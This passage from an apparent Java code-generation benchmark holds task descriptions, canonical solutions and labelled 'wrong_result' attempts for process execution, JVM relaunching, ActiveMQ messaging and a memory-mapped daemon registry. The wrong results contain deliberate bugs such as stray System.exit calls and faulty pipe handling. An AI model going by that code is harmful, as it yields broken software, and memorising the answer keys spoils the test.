Future<?> future = executor.submit(() -> {\n            try {\n                process.waitFor();\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n            }\n        });\n\n        try {\n            future.get(DOCKER_OUTPUT_TIMEOUT, TimeUnit.MILLISECONDS);\n        } catch (TimeoutException e) {\n            process.destroyForcibly();\n            throw new RuntimeException(\"Docker command timed out: \" + String.join(\" \", commandList), e);\n        } finally {\n            executor.shutdownNow();\n        }\n\n        int exitCode = process.exitValue();\n        if (exitCode != 0) {\n            String errorOutput = getStderrOutput(process);\n            throw new RuntimeException(\"Docker command failed with exit code \" + exitCode + \": \" + String.join(\" \", commandList) + \"\\nError: \" + errorOutput);\n        }\n\n        return process;\n    }\n\n    public DockerInfoDetails info() throws IOException, InterruptedException {\n        return fetchInfoDetails();\n    }\n\n    private DockerInfoDetails fetchInfoDetails() throws IOException, InterruptedException {\n        Process process = docker(\"info\", \"--format\", \"{{json .}}\");\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {\n            String jsonOutput = reader.lines().collect(Collectors.joining());\n            return parseDockerInfo(jsonOutput);\n        }\n    }\n\n    private DockerInfoDetails parseDockerInfo(String jsonOutput) {\n        // This is a placeholder for actual JSON parsing logic.\n        // You can use libraries like Jackson or Gson to parse the JSON string into an object.\n        return new DockerInfoDetails(jsonOutput);\n    }\n\n    public static class DockerInfoDetails {\n        private final String rawJson;\n\n        public DockerInfoDetails(String rawJson) {\n            this.rawJson = rawJson;\n        }\n\n        @Override\n        public String toString() {\n            return rawJson;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 291,
    "Instruction": "Task Description: Verify and ensure the Java Virtual Machine (JVM) is running on the first thread on macOS, relaunching the process if necessary with the correct arguments.\n\nFunction Description: This function checks if the JVM is running on the first thread on macOS, which is required for proper execution of certain applications. If not, it attempts to relaunch the process with the \"-XstartOnFirstThread\" argument. The function handles process creation, stream redirection, and output/error handling during the relaunch.\n\nInput: \n- args: String[] - Command-line arguments to be passed to the relaunched process (if needed)\n\nOutput: \n- boolean - Returns true if the JVM is already in a valid state (either not on macOS or already running on first thread), or false if a relaunch was attempted (the original process should exit in this case)",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.util.ArrayList;\nimport java.lang.management.ManagementFactory;\n\npublic static boolean verifyValidJVMState(String[] args){\n    if (SharedLibraryLoader.isMac){\n        if (\"1\".equals(System.getenv(\"JAVA_STARTED_ON_FIRST_THREAD_\" +\n                ManagementFactory.getRuntimeMXBean().getName().split(\"@\")[0]))) {\n            return true;\n        }\n\n        if (\"true\".equals(System.getProperty(\"shpdRelaunched\"))){\n            System.err.println(\"Error: Could not verify new process is running on the first thread. Trying to run the game anyway...\");\n            return true;\n        }\n\n        String sep = System.getProperty(\"file.separator\");\n\n        ArrayList<String> jvmArgs = new ArrayList<>();\n        jvmArgs.add(System.getProperty(\"java.home\") + sep + \"bin\" + sep + \"java\");\n        jvmArgs.add(\"-XstartOnFirstThread\");\n        jvmArgs.add(\"-DshpdRelaunched=true\");\n        jvmArgs.addAll(ManagementFactory.getRuntimeMXBean().getInputArguments());\n        jvmArgs.add(\"-cp\");\n        jvmArgs.add(System.getProperty(\"java.class.path\"));\n        jvmArgs.add(DesktopLauncher.class.getName());\n\n        System.err.println(\"Error: ShatteredPD must start on the first thread in order to work on macOS.\");\n        System.err.println(\"  To avoid this error, run the game with the \\\"-XstartOnFirstThread\\\" argument\");\n        System.err.println(\"  Now attempting to relaunch the game on the first thread automatically:\\n\");\n\n        try {\n            Process process = new ProcessBuilder(jvmArgs).redirectErrorStream(true).start();\n            BufferedReader out = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n\n            while ((line = out.readLine()) != null) {\n                if (line.toLowerCase().startsWith(\"error\")){\n                    System.err.println(line);\n                } else {\n                    System.out.println(line);\n                }\n            }\n\n            process.waitFor();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n\n        return false;\n    }\n\n    return true;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "```java\npublic class JvmFirstThreadChecker {\n    public static boolean checkAndRelaunchJVM(String[] args) {\n        if (!System.getProperty(\"os.name\").toLowerCase().contains(\"mac\")) {\n            return true;\n        }\n\n        try {\n            Thread.sleep(100);\n            Thread firstThread = new Thread(() -> {\n                try {\n                    Thread.sleep(1000);\n                } catch (InterruptedException e) {\n                }\n            }, \"TestThread\");\n            firstThread.start();\n            if (firstThread.isDaemon()) {\n                String javaHome = System.getProperty(\"java.home\");\n                String javaBin = javaHome + \"/bin/java\";\n                ProcessBuilder pb = new ProcessBuilder(\n                        javaBin,\n                        \"-XstartOnFirstThread\",\n                        \"-cp\", System.getProperty(\"java.class.path\"),\n                        JvmFirstThreadChecker.class.getName()\n                );\n\n                if (args != null && args.length > 0) {\n                    for (String arg : args) {\n                        pb.command().add(arg);\n                    }\n                }\n\n                pb.redirectErrorStream(true);\n                Process process = pb.start();\n                process.waitFor();\n                return false;\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n            return false;\n        }\n\n        return true;\n    }\n\n    public static void main(String[] args) {\n        if (!checkAndRelaunchJVM(args)) {\n            System.exit(0);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 293,
    "Instruction": "Task Description: Create a utility class for executing external processes in Java, handling both command execution and process stream management.\n\nClass Description: A ProcessExecutor utility class that provides methods to execute system commands and external processes, capturing their output and error streams, with proper resource cleanup.\n\nMethods:\n\nMethod1: runCmd(String... cmd) -> String - Executes a command using ProcessBuilder, captures the output stream, and checks the exit status. Throws exceptions if the process fails.\nInput: cmd - Varargs parameter representing the command and its arguments\nOutput: String - The output from the process's standard output stream\n\nMethod2: runExec(String[] argv) -> String - Executes a command using Runtime.exec(), captures the output stream, and checks the exit status. Throws exceptions if the process fails.\nInput: argv - String array representing the command and its arguments\nOutput: String - The output from the process's standard output stream\n\nMethod3: processOutputStreamInThread(Process process) -> void - Helper method that reads and discards process output in a separate thread to prevent stream blocking.\nInput: process - The Process object whose output stream needs to be processed\nOutput: None (void)",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\n\npublic static String runCmd(String... cmd) throws IOException, InterruptedException {\n    String output;\n    Process process = null;\n    try {\n        process = new ProcessBuilder(cmd).start();\n        output = StringUtil.readInputStream(process.getInputStream());\n        process.waitFor();\n        if (process.exitValue() != 0) {\n            System.err.println(String.format(\"%s Failed! Please check your signature file.\\n\", cmd[0]));\n            throw new RuntimeException(StringUtil.readInputStream(process.getErrorStream()));\n        }\n    } finally {\n        if (process != null) {\n            process.destroy();\n        }\n    }\n    return output;\n}\n\npublic static String runExec(String[] argv) throws IOException, InterruptedException {\n    Process process = null;\n    String output;\n    try {\n        process = Runtime.getRuntime().exec(argv);\n        output = StringUtil.readInputStream(process.getInputStream());\n        process.waitFor();\n        if (process.exitValue() != 0) {\n            System.err.println(String.format(\"%s Failed! Please check your signature file.\\n\", argv[0]));\n            throw new RuntimeException(StringUtil.readInputStream(process.getErrorStream()));\n        }\n    } finally {\n        if (process != null) {\n            process.destroy();\n        }\n    }\n    return output;\n}\n\nprivate static void processOutputStreamInThread(Process process) throws IOException {\n    InputStreamReader ir = new InputStreamReader(process.getInputStream());\n    LineNumberReader input = new LineNumberReader(ir);\n    while (input.readLine() != null) {\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "```java\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\n\npublic class ProcessExecutor {\n\n    public String runCmd(String... cmd) throws IOException, InterruptedException {\n        ProcessBuilder processBuilder = new ProcessBuilder(cmd);\n        processBuilder.redirectErrorStream(true);\n        Process process = processBuilder.start();\n        return readProcessOutput(process);\n    }\n\n    public String runExec(String[] argv) throws IOException, InterruptedException {\n        Process process = Runtime.getRuntime().exec(argv);\n        return readProcessOutput(process);\n    }\n\n    private String readProcessOutput(Process process) throws IOException, InterruptedException {\n        int exitCode = process.waitFor();\n        if (exitCode != 0) {\n            throw new RuntimeException(\"Process exited with code: \" + exitCode);\n        }\n        StringBuilder output = new StringBuilder();\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                output.append(line).append(\"\\n\");\n            }\n        }\n        return output.toString();\n    }\n\n    public void processOutputStreamInThread(Process process) {\n        Thread outputThread = new Thread(() -> {\n            try (InputStream is = process.getInputStream();\n                 BufferedReader reader = new BufferedReader(new InputStreamReader(is))) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    // Discard the output\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        });\n        outputThread.start();\n    }\n}\n```"
  },
  {
    "Task_id": 299,
    "Instruction": "Task Description: Create a Java class that facilitates the execution of external processes and manages their input/output streams, including support for piping data between multiple processes.\n\nClass Description: The ProcessRunner class provides functionality to execute external processes and handle their input/output streams efficiently. It supports both simple process execution and complex piping between multiple processes. The class uses ProcessBuilder for process creation and AsyncPipe threads for non-blocking stream handling.\n\nAttributes:\n- processRoot: File - The working directory for executed processes\n\nMethods:\n- execute(ProcessBuilder pb) -> void - Executes a single process with its output and error streams redirected to System.out and System.err respectively. Throws IOException and InterruptedException.\n- pipe(InputStream is, OutputStream os, ProcessBuilder... builders) -> void - Executes multiple processes in sequence, piping the output of one process to the input of the next. Uses temporary files for intermediate storage. Throws IOException and InterruptedException.\n- AsyncPipe(InputStream is, OutputStream os) - Constructor for AsyncPipe thread that handles stream copying and closes streams when done.\n- AsyncPipe(InputStream is, OutputStream os, boolean closeStreams) - Constructor for AsyncPipe thread with option to control stream closing behavior.\n- run() -> void - (AsyncPipe method) The thread's main execution method that copies data between streams.",
    "Canonical_solution": "import com.google.common.base.Joiner;\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\n\npublic class ProcessRunner {\n\n  File processRoot;\n\n  public ProcessRunner(File processRoot) {\n    this.processRoot = processRoot;\n  }\n\n  public void execute(ProcessBuilder pb) throws IOException, InterruptedException {\n    System.out.println(Joiner.on(\" \").join(pb.command()));\n    Process process = pb.redirectErrorStream(true).directory(processRoot).start();\n    new AsyncPipe(process.getErrorStream(), System.err).start();\n    new AsyncPipe(process.getInputStream(), System.out).start();\n    process.waitFor();\n  }\n\n  public void pipe(InputStream is, OutputStream os, ProcessBuilder... builders)\n      throws IOException, InterruptedException {\n    int i = 0;\n    File tempin;\n    File tempout = File.createTempFile(\"pipe\", \"txt\");\n    OutputStream tos;\n    for (ProcessBuilder builder : builders) {\n      if (i == 0) {\n      } else {\n        tempin = tempout;\n        is = new FileInputStream(tempin);\n      }\n      if (i == builders.length - 1) {\n        if (os == null) {\n          tos = System.out;\n        } else {\n          tos = os;\n        }\n      } else {\n        tempout = File.createTempFile(\"pipe\", \"txt\");\n        tos = new FileOutputStream(tempout);\n      }\n      Process process = builder.redirectErrorStream(true).directory(processRoot).start();\n      new AsyncPipe(process.getErrorStream(), System.err, false).start();\n      new AsyncPipe(process.getInputStream(), tos).start();\n      if (is != null) {\n        new AsyncPipe(is, process.getOutputStream()).start();\n      }\n      i++;\n      process.waitFor();\n    }\n  }\n\n  class AsyncPipe extends Thread {\n\n    InputStream is;\n    OutputStream os;\n    boolean closeStreams;\n\n    AsyncPipe(InputStream is, OutputStream os) {\n      this.is = is;\n      this.os = os;\n      closeStreams = true;\n    }\n\n    AsyncPipe(InputStream is, OutputStream os, boolean closeStreams) {\n      this.is = is;\n      this.os = os;\n      this.closeStreams = closeStreams;\n    }\n\n    @Override\n    public void run() {\n      try {\n        synchronized (this) {\n          byte[] buf = new byte[4096];\n          int i;\n          while ((i = is.read(buf)) != -1) {\n            os.write(buf, 0, i);\n          }\n          if (closeStreams) {\n            os.close();\n            is.close();\n          }\n        }\n      } catch (IOException e) {\n        e.printStackTrace();\n      }\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "```java\nimport java.io.*;\nimport java.util.concurrent.*;\n\npublic class ProcessRunner {\n    private File processRoot;\n\n    public ProcessRunner(File processRoot) {\n        this.processRoot = processRoot;\n    }\n\n    public void execute(ProcessBuilder pb) throws IOException, InterruptedException {\n        pb.directory(processRoot);\n        Process process = pb.start();\n        new AsyncPipe(process.getInputStream(), System.out).start();\n        new AsyncPipe(process.getErrorStream(), System.err).start();\n        new AsyncPipe(System.in, process.getOutputStream()).start();\n        int exitCode = process.waitFor();\n        System.exit(exitCode);\n    }\n\n    public void pipe(InputStream is, OutputStream os, ProcessBuilder... builders) throws IOException, InterruptedException {\n        ExecutorService executor = Executors.newFixedThreadPool(builders.length + 1);\n        Future<?>[] futures = new Future[builders.length + 1];\n        InputStream currentIn = is;\n        for (int i = 0; i < builders.length; i++) {\n            ProcessBuilder pb = builders[i];\n            pb.directory(processRoot);\n            Process process = pb.start();\n            futures[i] = executor.submit(new AsyncPipe(currentIn, process.getOutputStream()));\n            if (i == 0) {\n                futures[builders.length] = executor.submit(new AsyncPipe(process.getInputStream(), os));\n            } else {\n                futures[i + builders.length] = executor.submit(new AsyncPipe(process.getInputStream(), os));\n            }\n            currentIn = process.getInputStream();\n        }\n        for (Future<?> future : futures) {\n            future.get();\n        }\n        executor.shutdown();\n    }\n\n    public static class AsyncPipe extends Thread {\n        private final InputStream is;\n        private final OutputStream os;\n        private final boolean closeStreams;\n\n        public AsyncPipe(InputStream is, OutputStream os) {\n            this(is, os, true);\n        }\n\n        public AsyncPipe(InputStream is, OutputStream os, boolean closeStreams) {\n            this.is = is;\n            this.os = os;\n            this.closeStreams = closeStreams;\n        }\n\n        @Override\n        public void run() {\n            try {\n                byte[] buffer = new byte[1024];\n                int bytesRead;\n                while ((bytesRead = is.read(buffer)) != -1) {\n                    os.write(buffer, 0, bytesRead);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            } finally {\n                try {\n                    if (closeStreams) {\n                        is.close();\n                        os.close();\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 3,
    "Instruction": "Task Description: Create a Java class that implements an ActiveMQ producer for sending byte array messages to a specified queue.\n\nClass Description: The ActiveMQProducer class establishes a connection to an ActiveMQ broker, creates a message producer, and provides functionality to send byte array messages to a specified queue. It handles connection management and resource cleanup.\n\nAttributes:\n- connectionFactory: ActiveMQConnectionFactory - Factory for creating connections to the ActiveMQ broker\n- connection: javax.jms.Connection - The connection to the ActiveMQ broker\n- session: Session - JMS session for creating messages and producers\n- destination: Destination - The target queue for messages\n- producer: MessageProducer - The message producer for sending messages\n\nMethods:\n- ActiveMQProducer(String brokerUrl, String queueName) -> void - Constructor that initializes the connection to the ActiveMQ broker and sets up the message producer for the specified queue\n- sendBytesMessage(byte[] messageData) -> void - Creates and sends a bytes message containing the provided byte array to the configured queue\n- close() -> void - Closes the session and connection to release resources",
    "Canonical_solution": "import javax.jms.BytesMessage;\nimport javax.jms.Destination;\nimport javax.jms.JMSException;\nimport javax.jms.MessageProducer;\nimport javax.jms.Session;\nimport org.apache.activemq.ActiveMQConnectionFactory;\n\npublic class ActiveMQProducer {\n\n    private ActiveMQConnectionFactory connectionFactory;\n    private javax.jms.Connection connection;\n    private Session session;\n    private Destination destination;\n    private MessageProducer producer;\n\n    public ActiveMQProducer(String brokerUrl, String queueName) throws JMSException {\n        connectionFactory = new ActiveMQConnectionFactory(brokerUrl);\n        connection = connectionFactory.createConnection();\n        connection.start();\n        session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);\n        destination = session.createQueue(queueName);\n        producer = session.createProducer(destination);\n    }\n\n    public void sendBytesMessage(byte[] messageData) throws JMSException {\n        BytesMessage message = session.createBytesMessage();\n        message.writeBytes(messageData);\n        producer.send(message);\n    }\n\n    public void close() throws JMSException {\n        session.close();\n        connection.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 38,
    "wrong_result": "```java\nimport org.apache.activemq.ActiveMQConnectionFactory;\n\nimport javax.jms.*;\n\npublic class ActiveMQProducer {\n    private final ConnectionFactory connectionFactory;\n    private Connection connection;\n    private Session session;\n    private Destination destination;\n    private MessageProducer producer;\n\n    public ActiveMQProducer(String brokerUrl, String queueName) throws JMSException {\n        this.connectionFactory = new ActiveMQConnectionFactory(brokerUrl);\n        this.connection = connectionFactory.createConnection();\n        this.session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);\n        this.destination = session.createQueue(queueName);\n        this.producer = session.createProducer(destination);\n        connection.start();\n    }\n\n    public void sendBytesMessage(byte[] messageData) throws JMSException {\n        BytesMessage message = session.createBytesMessage();\n        message.writeBytes(messageData);\n        producer.send(message);\n    }\n\n    public void close() throws JMSException {\n        if (session != null) {\n            session.close();\n        }\n        if (connection != null) {\n            connection.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 30,
    "Instruction": "Task Description: Implement a thread-safe registry class for managing daemon processes using memory-mapped files for persistent storage. The class should handle concurrent access, automatic file resizing, and data recovery from corrupted states.\n\nClass Description: DaemonRegistry is a thread-safe class that maintains a registry of daemon processes in a memory-mapped file. It provides methods to read, update, and manage daemon information with proper file locking and automatic buffer resizing when needed. The class implements AutoCloseable for proper resource management.\n\nAttributes:\n- LOGGER: Logger - Logger instance for logging operations\n- MAX_LENGTH: int - Maximum initial size for the memory-mapped buffer (32KB)\n- LOCK_TIMEOUT_MS: long - Timeout duration for acquiring file locks (20 seconds)\n- locks: Map<Path, Object> - Static concurrent map for maintaining file-level locks\n- registryFile: Path - Path to the registry file\n- lck: Object - Instance-specific lock object\n- channel: FileChannel - File channel for the registry file\n- buffer: MappedByteBuffer - Memory-mapped byte buffer for the file\n- size: long - Current size of the memory-mapped buffer\n- infosMap: Map<String, DaemonInfo> - Map storing daemon information\n\nMethods:\n- DaemonRegistry(Path registryFile) -> void - Constructor that initializes the registry by creating or opening the specified file and setting up the memory-mapped buffer\n- close() -> void - Closes the file channel and releases system resources\n- getAll() -> List<DaemonInfo> - Returns a list of all registered daemon information\n- read() -> void - Reads all daemon information from the memory-mapped file into the internal map\n- doUpdate(Runnable updater) -> void - Performs a read or update operation with file locking, handles buffer resizing and data recovery\n- tryLock() -> FileLock - Attempts to acquire an exclusive lock on the file\n- reset() -> void - Clears the internal map and resets the buffer\n- readString() -> String - Reads a UTF-8 encoded string from the buffer\n- writeString(String str) -> void - Writes a UTF-8 encoded string to the buffer\n- nextPowerOf2(long a, long min) -> long - Helper method to calculate the next power of 2 greater than or equal to input values",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.BufferOverflowException;\nimport java.nio.BufferUnderflowException;\nimport java.nio.ByteBuffer;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.channels.FileLock;\nimport java.nio.charset.StandardCharsets;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\n\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class DaemonRegistry implements AutoCloseable {\n\n    private static final Logger LOGGER = LoggerFactory.getLogger(DaemonRegistry.class);\n    private static final int MAX_LENGTH = 32768;\n    private static final long LOCK_TIMEOUT_MS = 1000 * 20;\n    private static final Map<Path, Object> locks = new ConcurrentHashMap<>();\n\n    private final Path registryFile;\n    private final Object lck;\n    private final FileChannel channel;\n    private MappedByteBuffer buffer;\n    private long size;\n    private final Map<String, DaemonInfo> infosMap = new HashMap<>();\n\n    public DaemonRegistry(Path registryFile) {\n        final Path absPath = registryFile.toAbsolutePath().normalize();\n        this.lck = locks.computeIfAbsent(absPath, p -> new Object());\n        this.registryFile = absPath;\n        try {\n            if (!Files.isRegularFile(absPath)) {\n                if (!Files.isDirectory(absPath.getParent())) {\n                    Files.createDirectories(absPath.getParent());\n                }\n            }\n            channel = FileChannel.open(\n                    absPath, StandardOpenOption.CREATE, StandardOpenOption.READ, StandardOpenOption.WRITE);\n            size = nextPowerOf2(channel.size(), MAX_LENGTH);\n            buffer = channel.map(FileChannel.MapMode.READ_WRITE, 0, size);\n        } catch (IOException e) {\n            throw new DaemonException(e);\n        }\n    }\n\n    public void close() {\n        try {\n            channel.close();\n        } catch (IOException e) {\n            throw new DaemonException(\"Error closing registry\", e);\n        }\n    }\n\n    public List<DaemonInfo> getAll() {\n        read();\n        return new ArrayList<>(infosMap.values());\n    }\n\n    private void read() {\n        doUpdate(null);\n    }\n\n    private void doUpdate(Runnable updater) {\n        if (!Files.isReadable(registryFile)) {\n            throw new DaemonException(\"Registry became unaccessible\");\n        }\n\n        synchronized (lck) {\n            final long deadline = System.currentTimeMillis() + LOCK_TIMEOUT_MS;\n            while (System.currentTimeMillis() < deadline) {\n                try (FileLock l = tryLock()) {\n                    BufferCaster.cast(buffer).position(0);\n                    infosMap.clear();\n                    int nb = buffer.getInt();\n                    for (int i = 0; i < nb; i++) {\n                        String daemonId = readString();\n                        String javaHome = readString();\n                        String mavenHome = readString();\n                        int pid = buffer.getInt();\n                        String address = readString();\n\n                        byte[] token = new byte[DaemonInfo.TOKEN_SIZE];\n                        buffer.get(token);\n\n                        String locale = readString();\n                        List<String> opts = new ArrayList<>();\n                        int nbOpts = buffer.getInt();\n                        for (int j = 0; j < nbOpts; j++) {\n                            opts.add(readString());\n                        }\n                        DaemonState state = DaemonState.values()[buffer.get()];\n                        long lastIdle = buffer.getLong();\n                        long lastBusy = buffer.getLong();\n                        DaemonInfo di = new DaemonInfo(\n                                daemonId, javaHome, mavenHome, pid, address, token, locale, opts, state, lastIdle,\n                                lastBusy);\n                        infosMap.putIfAbsent(di.getId(), di);\n                    }\n\n                    if (updater != null) {\n                        updater.run();\n                        BufferCaster.cast(buffer).position((int) 0);\n                        buffer.putInt(infosMap.size());\n                        for (DaemonInfo di : infosMap.values()) {\n                            writeString(di.getId());\n                            writeString(di.getJavaHome());\n                            writeString(di.getMvndHome());\n                            buffer.putInt(di.getPid());\n                            writeString(di.getAddress());\n                            buffer.put(di.getToken());\n                            writeString(di.getLocale());\n                            buffer.putInt(di.getOptions().size());\n                            for (String opt : di.getOptions()) {\n                                writeString(opt);\n                            }\n                            buffer.put((byte) di.getState().ordinal());\n                            buffer.putLong(di.getLastIdle());\n                            buffer.putLong(di.getLastBusy());\n                        }\n                    }\n                    return;\n                } catch (BufferOverflowException e) {\n                    size <<= 1;\n                    LOGGER.info(\"Resizing registry to {} kb due to buffer overflow\", (size / 1024));\n                    try {\n                        buffer = channel.map(FileChannel.MapMode.READ_WRITE, 0, size);\n                    } catch (IOException ex) {\n                        ex.addSuppressed(e);\n                        throw new DaemonException(\"Could not resize registry \" + registryFile, ex);\n                    }\n                } catch (IOException e) {\n                    throw new DaemonException(\n                            \"Exception while \" + (updater != null ? \"updating \" : \"reading \") + registryFile, e);\n                } catch (IllegalStateException | ArrayIndexOutOfBoundsException | BufferUnderflowException e) {\n                    String absPath = registryFile.toAbsolutePath().normalize().toString();\n                    LOGGER.warn(\n                            \"Invalid daemon registry info, trying to recover from this issue. \"\n                                    + \"If you keep getting this warning, try deleting the `registry.bin` file at [{}]\",\n                            absPath,\n                            e);\n                    this.reset();\n                    return;\n                }\n            }\n            throw new RuntimeException(\"Could not lock \" + registryFile + \" within \" + LOCK_TIMEOUT_MS + \" ms\");\n        }\n    }\n\n    private FileLock tryLock() {\n        try {\n            return channel.tryLock(0, size, false);\n        } catch (IOException e) {\n            throw new DaemonException(\"Could not lock \" + registryFile, e);\n        }\n    }\n\n    private void reset() {\n        infosMap.clear();\n        BufferCaster.cast(buffer).clear();\n        buffer.putInt(0);\n    }\n\n    protected String readString() {\n        int sz = buffer.getShort();\n        if (sz == -1) {\n            return null;\n        }\n        if (sz < -1 || sz > 1024) {\n            throw new IllegalStateException(\"Bad string size: \" + sz);\n        }\n        byte[] buf = new byte[sz];\n        buffer.get(buf);\n        return new String(buf, StandardCharsets.UTF_8);\n    }\n\n    protected void writeString(String str) {\n        if (str == null) {\n            buffer.putShort((short) -1);\n            return;\n        }\n        byte[] buf = str.getBytes(StandardCharsets.UTF_8);\n        if (buf.length > 1024) {\n            LOGGER.warn(\"Attempting to write string longer than 1024 bytes: '{}'. Please raise an issue.\", str);\n            str = str.substring(0, 1033);\n            while (buf.length > 1024) {\n                str = str.substring(0, str.length() - 12) + \"\u2026\";\n                buf = str.getBytes(StandardCharsets.UTF_8);\n            }\n        }\n        buffer.putShort((short) buf.length);\n        buffer.put(buf);\n    }\n\n    private long nextPowerOf2(long a, long min) {\n        long b = min;\n        while (b < a) {\n            b = b << 1;\n        }\n        return b;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "```java\nimport java.io.IOException;\nimport java.io.RandomAccessFile;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.channels.FileLock;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.util.ArrayList;\nimport java.util.Collections;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.ConcurrentMap;\nimport java.util.logging.Logger;\n\npublic class DaemonRegistry implements AutoCloseable {\n    private static final Logger LOGGER = Logger.getLogger(DaemonRegistry.class.getName());\n    private static final int MAX_LENGTH = 32768; // 32KB\n    private static final long LOCK_TIMEOUT_MS = 20000;\n    private static final ConcurrentMap<Path, Object> locks = new ConcurrentHashMap<>();\n\n    private final Path registryFile;\n    private final Object lck = new Object();\n    private FileChannel channel;\n    private ByteBuffer buffer;\n    private long size;\n    private final Map<String, DaemonInfo> infosMap = new ConcurrentHashMap<>();\n\n    public DaemonRegistry(Path registryFile) throws IOException {\n        this.registryFile = registryFile;\n        Files.createDirectories(registryFile.getParent());\n        if (!Files.exists(registryFile)) {\n            Files.createFile(registryFile);\n        }\n\n        synchronized (getLockObject()) {\n            channel = FileChannel.open(registryFile, java.nio.file.StandardOpenOption.READ, java.nio.file.StandardOpenOption.WRITE);\n            resize(MAX_LENGTH);\n            read();\n        }\n    }\n\n    @Override\n    public void close() throws IOException {\n        synchronized (lck) {\n            if (channel != null && channel.isOpen()) {\n                channel.close();\n            }\n        }\n    }\n\n    public List<DaemonInfo> getAll() {\n        return new ArrayList<>(infosMap.values());\n    }\n\n    private void read() {\n        synchronized (lck) {\n            reset();\n            try {\n                buffer.position(0);\n                while (buffer.hasRemaining()) {\n                    String id = readString();\n                    if (id == null || id.isEmpty()) break;\n                    String name = readString();\n                    String status = readString();\n                    if (name != null && status != null) {\n                        DaemonInfo info = new DaemonInfo(id, name, status);\n                        infosMap.put(id, info);\n                    }\n                }\n            } catch (Exception e) {\n                LOGGER.severe(\"Error reading daemon registry: \" + e.getMessage());\n                recover();\n            }\n        }\n    }\n\n    private void doUpdate(Runnable updater) {\n        synchronized (lck) {\n            FileLock lock = null;\n            try {\n                lock = tryLock();\n                if (lock == null) {\n                    throw new IOException(\"Failed to acquire file lock within timeout.\");\n                }\n                updater.run();\n            } catch (IOException | RuntimeException e) {\n                LOGGER.severe(\"Error during update operation: \" + e.getMessage());\n                recover();\n            } finally {\n                if (lock != null) {\n                    try {\n                        lock.release();\n                    } catch (IOException e) {\n                        LOGGER.warning(\"Failed to release file lock: \" + e.getMessage());\n                    }\n                }\n            }\n        }\n    }\n\n    private FileLock tryLock() throws IOException {\n        long start = System.currentTimeMillis();\n        while (true) {\n            try {\n                return channel.tryLock();\n            } catch (OverlappingFileLockException e) {\n                if (System.currentTimeMillis() - start > LOCK_TIMEOUT_MS) {\n                    return null;\n                }\n                try {\n                    Thread.sleep(100);\n                } catch (InterruptedException ignored) {\n                    Thread.currentThread().interrupt();\n                    return null;\n                }\n            }\n        }\n    }\n\n    private void reset() {\n        synchronized (lck) {\n            buffer.clear();\n            buffer.position(0);\n            buffer.limit((int) Math.min(size, Integer.MAX_VALUE));\n            infosMap.clear();\n        }\n    }\n\n    private String readString() {\n        int length = buffer.getInt();\n        if (length <= 0) return \"\";\n        byte[] bytes = new byte[length];\n        buffer.get(bytes);\n        return new String(bytes);\n    }\n\n    private void writeString(String str) {\n        byte[] bytes = str.getBytes(java.nio.charset.StandardCharsets.UTF_8);\n        buffer.putInt(bytes.length);\n        buffer.put(bytes);\n    }\n\n    private void resize(long newSize) throws IOException {\n        if (newSize < size) return;\n        if (newSize < MAX_LENGTH) newSize = MAX_LENGTH;\n        newSize = nextPowerOf2(newSize, MAX_LENGTH);\n\n        synchronized (lck) {\n            if (buffer != null) {\n                buffer.force();\n                buffer = null;\n            }\n            channel.truncate(newSize);\n            buffer = channel.map(FileChannel.MapMode.READ_WRITE, 0, newSize);\n            size = newSize;\n        }\n    }\n\n    private void recover() {\n        synchronized (lck) {\n            try {\n                reset();\n                read();\n            } catch (Exception e) {\n                LOGGER.severe(\"Data recovery failed: \" + e.getMessage());\n                try {\n                    Files.deleteIfExists(registryFile);\n                    Files.createFile(registryFile);\n                } catch (IOException ex) {\n                    LOGGER.severe(\"Failed to recreate registry file: \" + ex.getMessage());\n                }\n            }\n        }\n    }\n\n    private long nextPowerOf2(long a, long min) {\n        if (a < min) return min;\n        long result = 1L << (64 - Long.numberOfLeadingZeros(a - 1));\n        return result;\n    }\n\n    private Object getLockObject() {\n        return locks.computeIfAbsent(registryFile, k -> new Object());\n    }\n\n    public static class DaemonInfo {\n        private final String id;\n        private final String name;\n        private final String status;\n\n        public DaemonInfo(String id, String name, String status) {\n            this.id = id;\n            this.name = name;\n            this.status = 